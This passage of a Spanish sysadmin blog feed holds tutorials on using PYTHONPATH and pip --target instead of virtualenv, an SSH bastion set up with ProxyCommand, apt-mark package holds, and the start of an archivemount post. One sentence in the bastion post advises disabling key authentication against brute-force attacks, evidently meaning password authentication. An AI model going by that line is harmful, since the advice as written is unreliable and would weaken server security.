&lt;p&gt;No importa cuantas veces se caiga el túnel; cuando eso pase, el contenedor acabará y el demonio de &lt;strong&gt;Docker&lt;/strong&gt; lo va a volver a levantar.&lt;/p&gt;</content><category term="ssh"></category><category term="túnel"></category><category term="docker"></category><category term="docker-compose"></category></entry><entry><title>Evitando usar virtualenv mediante el uso de PYTHONPATH</title><link href="https://www.linuxsysadmin.ml/2018/01/evitando-usar-virtualenv-mediante-el-uso-de-pythonpath.html" rel="alternate"></link><published>2018-01-22T10:00:00+01:00</published><updated>2018-01-22T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-01-22:/2018/01/evitando-usar-virtualenv-mediante-el-uso-de-pythonpath.html</id><summary type="html">&lt;p&gt;Soy un gran fan de &lt;strong&gt;python&lt;/strong&gt; y siempre ando trasteando con alguna librería nueva, en vistas a un &lt;em&gt;script&lt;/em&gt; para simplificar mi trabajo, o simplemente como un &lt;em&gt;wekeend project&lt;/em&gt;. Me es infinitamente útil usar &lt;strong&gt;virtualenv&lt;/strong&gt;, pero genera una carpeta que ocupa demasiado y contiene algo más que solamente las librerías …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Soy un gran fan de &lt;strong&gt;python&lt;/strong&gt; y siempre ando trasteando con alguna librería nueva, en vistas a un &lt;em&gt;script&lt;/em&gt; para simplificar mi trabajo, o simplemente como un &lt;em&gt;wekeend project&lt;/em&gt;. Me es infinitamente útil usar &lt;strong&gt;virtualenv&lt;/strong&gt;, pero genera una carpeta que ocupa demasiado y contiene algo más que solamente las librerías.&lt;/p&gt;
&lt;p&gt;De hecho, solo tenemos que comprobar lo que ocupa un &lt;em&gt;virtualenv&lt;/em&gt; vacío:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ virtualenv env
New python executable in /home/gerard/test/env/bin/python
Installing setuptools, pip, wheel...done.
gerard@aldebaran:~/test$ du -sh env/
16M env/
gerard@aldebaran:~/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por el propio funcionamiento de &lt;strong&gt;python&lt;/strong&gt;, las carpetas de librerías son relativas al binario del mismo lenguaje, así que no es de extrañar que &lt;em&gt;virtualenv&lt;/em&gt; ponga un binario en cada entorno; activar este entorno se limita a poner la carpeta &lt;em&gt;bin/&lt;/em&gt; del &lt;em&gt;virtualenv&lt;/em&gt; en el &lt;em&gt;PATH&lt;/em&gt;. A esto le añadimos las herramientas &lt;em&gt;pip&lt;/em&gt; y &lt;em&gt;easy_install&lt;/em&gt;, y tenemos un montón de espacio desperdiciado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ find env/ -type f &lt;span class="p"&gt;|&lt;/span&gt; xargs ls -lrSh &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null &lt;span class="p"&gt;|&lt;/span&gt; tail
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 114K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pkg_resources/__init__.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 114K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/pkg_resources/__init__.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 115K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/html5lib/html5parser.py
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 119K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/html5lib/html5parser.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 219K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/pyparsing.py
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 221K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pyparsing.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 222K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/pyparsing.pyc
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 226K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pyparsing.py
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard 337K mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/lib/python2.7/site-packages/pip/_vendor/requests/cacert.pem
-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard &lt;span class="m"&gt;3&lt;/span&gt;,7M mar &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:13 env/bin/python
gerard@aldebaran:~/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Las carpetas desde las que se cargan los módulos y librerías de &lt;strong&gt;python&lt;/strong&gt; no son inmutables; se pueden añadir en &lt;em&gt;runtime&lt;/em&gt; a la lista &lt;em&gt;sys.path&lt;/em&gt; o se puede indicar en las variables de entorno del sistema, como podemos ver en &lt;a href="https://docs.python.org/2/using/cmdline.html#envvar-PYTHONPATH"&gt;la documentación&lt;/a&gt;. Solo necesitamos una manera de instalarlas en una carpeta propia, y esto es precisamente lo que nos permite el &lt;em&gt;flag --target&lt;/em&gt; de &lt;em&gt;pip&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ pip install -t libs mongoengine
Collecting mongoengine
Collecting six &lt;span class="o"&gt;(&lt;/span&gt;from mongoengine&lt;span class="o"&gt;)&lt;/span&gt;
  Using cached six-1.10.0-py2.py3-none-any.whl
Collecting pymongo&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.1 &lt;span class="o"&gt;(&lt;/span&gt;from mongoengine&lt;span class="o"&gt;)&lt;/span&gt;
  Using cached pymongo-3.4.0-cp27-cp27mu-manylinux1_x86_64.whl
Installing collected packages: six, pymongo, mongoengine
Successfully installed mongoengine-0.11.0 pymongo-3.4.0 six-1.10.0
gerard@aldebaran:~/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y eso nos instala las librerías con sus dependencias en la carpeta &lt;em&gt;libs/&lt;/em&gt;, que va a crear si hace falta.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Si el paquete instalaba binarios, no va a hacerlo, ya que no dispone de tal carpeta para dejarlo; este método no sería posible.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ tree -d libs/
libs/
├── bson
├── gridfs
├── mongoengine
│   ├── base
│   └── queryset
├── mongoengine-0.11.0.dist-info
├── pymongo
├── pymongo-3.4.0.dist-info
└── six-1.10.0.dist-info

&lt;span class="m"&gt;9&lt;/span&gt; directories
gerard@aldebaran:~/test$ du -sh libs/
&lt;span class="m"&gt;3&lt;/span&gt;,2M    libs/
gerard@aldebaran:~/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A pesar de la reducción de tamaño en disco, esto por sí solo no nos sirve de nada; si no le indicamos donde tiene que buscar &lt;strong&gt;mongoengine&lt;/strong&gt;, el intérprete va a fallar importándolo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9 &lt;span class="o"&gt;(&lt;/span&gt;default, Jun &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;13&lt;/span&gt;:08:31&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.9.2&lt;span class="o"&gt;]&lt;/span&gt; on linux2
Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import mongoengine
Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
  File &lt;span class="s2"&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &amp;lt;module&amp;gt;
ImportError: No module named mongoengine
&amp;gt;&amp;gt;&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para usar esa carpeta de librerías, solo necesitamos que el intérprete de &lt;strong&gt;python&lt;/strong&gt; sepa donde están, sea por la variable de entorno o modificando la lista de carpetas &lt;em&gt;sys.path&lt;/em&gt; en &lt;em&gt;runtime&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Veamos ambos casos, empezando con la opción en &lt;em&gt;runtime&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9 &lt;span class="o"&gt;(&lt;/span&gt;default, Jun &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;13&lt;/span&gt;:08:31&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.9.2&lt;span class="o"&gt;]&lt;/span&gt; on linux2
Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import mongoengine
Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
  File &lt;span class="s2"&gt;&amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &amp;lt;module&amp;gt;
ImportError: No module named mongoengine
&amp;gt;&amp;gt;&amp;gt; import sys
&amp;gt;&amp;gt;&amp;gt; sys.path.append&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;libs&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; import mongoengine
&amp;gt;&amp;gt;&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo queda hacerlo mediante el uso de la variable de entorno &lt;em&gt;PYTHONPATH&lt;/em&gt;, sea exportándola para su uso futuro, o modificándola solo para el proceso acompañante:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/test$ &lt;span class="nv"&gt;PYTHONPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;libs python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9 &lt;span class="o"&gt;(&lt;/span&gt;default, Jun &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;13&lt;/span&gt;:08:31&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.9.2&lt;span class="o"&gt;]&lt;/span&gt; on linux2
Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import mongoengine
&amp;gt;&amp;gt;&amp;gt; 
&amp;gt;&amp;gt;&amp;gt; exit&lt;span class="o"&gt;()&lt;/span&gt;
gerard@aldebaran:~/test$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PYTHONPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;libs
gerard@aldebaran:~/test$ python
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9 &lt;span class="o"&gt;(&lt;/span&gt;default, Jun &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2016&lt;/span&gt;, &lt;span class="m"&gt;13&lt;/span&gt;:08:31&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;span class="o"&gt;[&lt;/span&gt;GCC &lt;span class="m"&gt;4&lt;/span&gt;.9.2&lt;span class="o"&gt;]&lt;/span&gt; on linux2
Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import mongoengine
&amp;gt;&amp;gt;&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora toca elegir cual de las dos formas os gusta más. Yo suelo utilizar la variable de entorno cuando ejecuto un &lt;em&gt;script&lt;/em&gt; de &lt;em&gt;bash&lt;/em&gt;, sino lo hago mediante &lt;em&gt;python&lt;/em&gt;.&lt;/p&gt;</content><category term="python"></category><category term="virtualenv"></category><category term="pip"></category></entry><entry><title>Usando un bastión SSH</title><link href="https://www.linuxsysadmin.ml/2018/01/usando-un-bastion-ssh.html" rel="alternate"></link><published>2018-01-02T10:00:00+01:00</published><updated>2018-01-02T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-01-02:/2018/01/usando-un-bastion-ssh.html</id><summary type="html">&lt;p&gt;Hoy vamos a presentar un patrón de conectividad para acceder a un conjunto de máquinas, exponiendo solamente una de ellas, y aprovechando el protocolo SSH para pasar el tráfico a través, de forma transparente. Eso facilita los casos en los que no podemos tener una VPN o una red dedicada …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hoy vamos a presentar un patrón de conectividad para acceder a un conjunto de máquinas, exponiendo solamente una de ellas, y aprovechando el protocolo SSH para pasar el tráfico a través, de forma transparente. Eso facilita los casos en los que no podemos tener una VPN o una red dedicada.&lt;/p&gt;
&lt;p&gt;Vamos a suponer que tenemos un entorno con 4 máquinas, una de las cuales tiene el protocolo SSH abierto a una red menos confiable. Por supuesto, en casos así se recomienda encarecidamente no permitir la autenticación por claves, ya que os pueden acabar entrando usando ataques de fuerza bruta o de diccionario.&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSH bastion host" src="https://www.linuxsysadmin.ml/images/ssh-bastion-host.png"&gt;&lt;/p&gt;
&lt;p&gt;En nuestro caso vamos a llamar a la primera máquina como &lt;em&gt;bastion&lt;/em&gt; y las otras tres como &lt;em&gt;server1&lt;/em&gt;, &lt;em&gt;server2&lt;/em&gt; y &lt;em&gt;server3&lt;/em&gt; respectivamente. Todas ellas disponen de acceso por claves SSH y un usuario dedicado. No hace falta que ninguna de las máquinas tenga las mismas claves ni los mismos usuarios, pero hacerlo nos va a facilitar bastante la configuración SSH del cliente. En nuestro caso vamos a usar la misma clave para todos y el mismo usuario &lt;em&gt;jump&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El truco está en usar la directiva &lt;em&gt;ProxyCommand&lt;/em&gt; para que el tráfico hacia los servidores privados se haga &lt;strong&gt;a través&lt;/strong&gt; de una sesión SSH al servidor &lt;em&gt;bastion&lt;/em&gt;. Es importante decir que para que esto pase, el servidor &lt;em&gt;bastion&lt;/em&gt; debe poder resolver el nombre de la máquina que pasemos al comando SSH, ya que es lo que se va a usar para acceder a la misma.&lt;/p&gt;
&lt;p&gt;Para hacerme la vida más fácil he creado los usuarios mediante un &lt;em&gt;playbook&lt;/em&gt; de &lt;strong&gt;ansible&lt;/strong&gt;, aunque esto es opcional. Basta con crear los usuarios y poner la clave SSH pública en el fichero &lt;em&gt;authorized_keys&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@purgatory:~$ cat create_users.yml 
- hosts: all
  gather_facts: no
  tasks:
    - user: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump &lt;span class="nv"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/bash &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;present
    - file: &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/jump/.ssh &lt;span class="nv"&gt;owner&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump &lt;span class="nv"&gt;group&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;directory
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;../keys/id_jump.pub &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/jump/.ssh/authorized_keys &lt;span class="nv"&gt;owner&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump &lt;span class="nv"&gt;group&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump
gerard@purgatory:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí definimos dos reglas en nuestra configuración SSH cliente; una para el servidor &lt;em&gt;bastion&lt;/em&gt; (que no necesita de un &lt;em&gt;proxy&lt;/em&gt; SSH) y otra serie de reglas para las que sí necesitan del &lt;em&gt;proxy&lt;/em&gt;. Fijaos que cuentan cada una con su propio usuario y su clave SSH, que son la misma, pero podrían ser diferentes. Además, como la configuración de los servidores privados coincide, podemos acortar usando las mismas directivas para los 3 &lt;em&gt;hosts&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@purgatory:~$ cat .ssh/config 
...
Host bastion
    HostName &lt;span class="m"&gt;172&lt;/span&gt;.20.0.4
    User jump
    IdentityFile ~/.ssh/id_jump

Host server1 server2 server3
    User jump
    IdentityFile ~/.ssh/id_jump
    ProxyCommand ssh -F ssh_config -W %h:%p bastion
gerard@purgatory:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda comprobar que podemos acceder a la máquina &lt;em&gt;bastion&lt;/em&gt; sin problemas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@purgatory:~$ ssh bastion uname -a
Linux bastion &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-amd64 &lt;span class="c1"&gt;#1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux&lt;/span&gt;
gerard@purgatory:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y también podemos comprobar que llegamos a las máquinas a las que de otra forma no llegaríamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@purgatory:~$ ssh server1 uname -a
Linux server1 &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-amd64 &lt;span class="c1"&gt;#1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux&lt;/span&gt;
gerard@purgatory:~$ ssh server2 uname -a
Linux server2 &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-amd64 &lt;span class="c1"&gt;#1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux&lt;/span&gt;
gerard@purgatory:~$ ssh server3 uname -a
Linux server3 &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-amd64 &lt;span class="c1"&gt;#1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux&lt;/span&gt;
gerard@purgatory:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es interesante comprobar que tras acceder desde nuestra máquina, la segunda sesión nos informa que la anterior se realizó desde &lt;em&gt;bastion&lt;/em&gt;, y no desde la nuestra; la nuestra se conecta a &lt;em&gt;bastion&lt;/em&gt; que es la que se conecta al resto, llegando a servidores en los que no habríamos llegado de otra manera.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ ssh server1
...  
Last login: Thu Nov &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:35:30 &lt;span class="m"&gt;2016&lt;/span&gt; from bastion
jump@server1:~$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="ssh"></category><category term="bastion"></category><category term="pubkey"></category></entry><entry><title>Manteniendo la versión de paquetes en Debian y Ubuntu</title><link href="https://www.linuxsysadmin.ml/2017/12/manteniendo-la-version-de-paquetes-en-debian-y-ubuntu.html" rel="alternate"></link><published>2017-12-26T10:00:00+01:00</published><updated>2017-12-26T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-12-26:/2017/12/manteniendo-la-version-de-paquetes-en-debian-y-ubuntu.html</id><summary type="html">&lt;p&gt;Una de las operaciones más rutinarias que podemos tener como administradores de sistemas Linux es la actualización de un servidor. Mecánicamente lanzas &lt;strong&gt;apt-get upgrade&lt;/strong&gt; y te quedas tan tranquilo con la tarea completa. Poco después te encuentras con alguien cabreado porque alguna librería o servicio no va adecuadamente como antes …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Una de las operaciones más rutinarias que podemos tener como administradores de sistemas Linux es la actualización de un servidor. Mecánicamente lanzas &lt;strong&gt;apt-get upgrade&lt;/strong&gt; y te quedas tan tranquilo con la tarea completa. Poco después te encuentras con alguien cabreado porque alguna librería o servicio no va adecuadamente como antes.&lt;/p&gt;
&lt;p&gt;Lo que realmente ha pasado es que hemos cambiado de versión alguna pieza de &lt;em&gt;software&lt;/em&gt;, y la nueva tiene incompatibilidades con lo que hay funcionando. Es un caso raro, pero a veces se da, y muchas veces con previo aviso.&lt;/p&gt;
&lt;p&gt;¿Como se puede evitar que un servicio cambie de versión cuando actualiza? Muy sencillo: se llama &lt;em&gt;pinning&lt;/em&gt; y es muy fácil de hacer con &lt;strong&gt;Debian&lt;/strong&gt; o &lt;strong&gt;Ubuntu&lt;/strong&gt;. Veamos un ejemplo:&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos un servidor de contenedores &lt;strong&gt;Docker&lt;/strong&gt;. Por un tema de estabilidad queremos mantener la versión actual. Para ello necesitamos saber el nombre del paquete que queramos congelar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ dpkg -l &lt;span class="p"&gt;|&lt;/span&gt; grep docker
ii  docker-ce                     &lt;span class="m"&gt;17&lt;/span&gt;.09.0~ce-0~debian            amd64        Docker: the open-source application container engine
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En nuestro caso, el paquete es &lt;strong&gt;docker-ce&lt;/strong&gt;. Solo hace falta utilizar el comando &lt;strong&gt;apt-mark&lt;/strong&gt; para que lo mantenga en la version actual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-mark hold docker-ce
docker-ce fijado como retenido.
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de ahora, este paquete &lt;strong&gt;no se va a actualizar&lt;/strong&gt;. Si queremos ver que paquetes tenemos congelados, el mismo comando ofrece la operación &lt;em&gt;showhold&lt;/em&gt; que nos listaría los paquetes en modo &lt;em&gt;pinning&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-mark showhold
docker-ce
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si en algún momento quisieramos volver a actualizarlo, bastaría con quitarle el &lt;em&gt;hold&lt;/em&gt;, con el mismo comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-mark unhold docker-ce
Se ha cancelado la retención de docker-ce.
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora ya podríamos modificar la versión de &lt;strong&gt;docker-ce&lt;/strong&gt;. Necesitaríamos los comandos habituales &lt;strong&gt;apt-get&lt;/strong&gt;, &lt;strong&gt;aptitude&lt;/strong&gt; u otro frontal gráfico. Podéis verificar que vuestro paquete ya no está en modo &lt;em&gt;hold&lt;/em&gt; listando los paquetes en dicho estado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-mark showhold
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto nos evitamos esos molestos cambios de versión que nos traen incompatibilidades con las aplicaciones que mantenemos.&lt;/p&gt;</content><category term="debian"></category><category term="ubuntu"></category><category term="apt"></category><category term="apt-mark"></category><category term="pinning"></category></entry><entry><title>Usar un sistema de ficheros de lectura y escritura en un fichero .tar.gz</title><link href="https://www.linuxsysadmin.ml/2017/10/usar-un-sistema-de-ficheros-de-lectura-y-escritura-en-un-fichero-targz.md.html" rel="alternate"></link><published>2017-10-23T10:00:00+02:00</published><updated>2017-10-23T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-10-23:/2017/10/usar-un-sistema-de-ficheros-de-lectura-y-escritura-en-un-fichero-targz.md.html</id><summary type="html">&lt;p&gt;¿Alguna vez habéis querido mirar en fichero &lt;em&gt;.tar.gz&lt;/em&gt;, pero sin tener que descomprimirlo? Tal vez te gustaría extraer solo unos pocos ficheros; puede que lo que te interese es trabajar con una carpeta a la que le modificamos los archivos, sin tener que archivar esta carpeta cada cierto tiempo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;¿Alguna vez habéis querido mirar en fichero &lt;em&gt;.tar.gz&lt;/em&gt;, pero sin tener que descomprimirlo? Tal vez te gustaría extraer solo unos pocos ficheros; puede que lo que te interese es trabajar con una carpeta a la que le modificamos los archivos, sin tener que archivar esta carpeta cada cierto tiempo.&lt;/p&gt;
&lt;p&gt;En este caso, tenemos un sistema de ficheros bastante interesante que se llama &lt;strong&gt;archivemount&lt;/strong&gt;, y que nos permite ver un fichero &lt;em&gt;.tar.gz&lt;/em&gt; como si de una carpeta local más se tratara. Al desmontar este sistema de fichero, se crea el mismo fichero de nuevo, de forma automática, y con previa copia del anterior.&lt;/p&gt;
&lt;p&gt;Según la &lt;a href="https://en.wikipedia.org/wiki/Archivemount"&gt;wikipedia&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;archivemount is a FUSE-based file system for Unix variants, including Linux. Its purpose is to mount archives (i.e. tar, tar.gz, etc.) to a mount point where it can be read from or written to as with any other file system. This makes accessing the contents of the archive, which may be compressed, transparent to other programs, without decompressing them.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Para demostrar como funciona, necesitaremos una máquina normal. Como pienso desecharla tal como haya escrito estas palabras, voy a usar un contenedor &lt;strong&gt;docker&lt;/strong&gt; con una &lt;strong&gt;Debian Jessie&lt;/strong&gt;; la distribución no debería ser importante.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: No se puede usar el comando &lt;strong&gt;archivemount&lt;/strong&gt; en un contenedor &lt;strong&gt;docker&lt;/strong&gt;, a menos que se levante con la opción &lt;em&gt;--privileged&lt;/em&gt;, que es lo que yo he usado.&lt;/p&gt;
